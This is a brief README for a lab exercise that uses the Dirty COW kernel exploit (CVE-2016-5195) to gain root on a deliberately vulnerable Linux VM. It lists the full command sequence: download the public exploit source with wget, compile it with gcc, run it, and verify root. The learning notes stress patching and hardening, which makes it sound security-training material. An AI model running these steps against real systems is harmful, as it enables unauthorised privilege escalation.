# Linux Privilege Escalation (Dirty COW – CVE-2016-5195)

##  Project Overview
This project demonstrates privilege escalation on a vulnerable Linux kernel using the **Dirty COW exploit (CVE-2016-5195)**.  
By exploiting a race condition in the kernel’s memory handling, a normal user was able to escalate privileges to **root access**.  

---

##  Tools & Environment
- Vulnerable Linux VM (e.g., Metasploitable2 or custom kernel)  
- Dirty COW exploit (C source code)  
- GCC (GNU Compiler Collection)  

---

##  Steps & Methodology

 **1.Check kernel version (confirm vulnerability):**
      uname -r
 
 **2.Download Dirty COW exploit code:**
      wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c -O dirty.c
 
 **3.Compile the exploit:**
      gcc -pthread dirty.c -o dirty -lcrypt

 **4.Execute the exploit to escalate privileges:**
      ./dirty

 **5.Verify root access:**
      whoami
      id

   **Learning Outcomes**

         Practical experience in Linux privilege escalation.

         Understanding kernel-level vulnerabilities and exploitation.

         Importance of regular patching & kernel hardening to defend against such attacks.
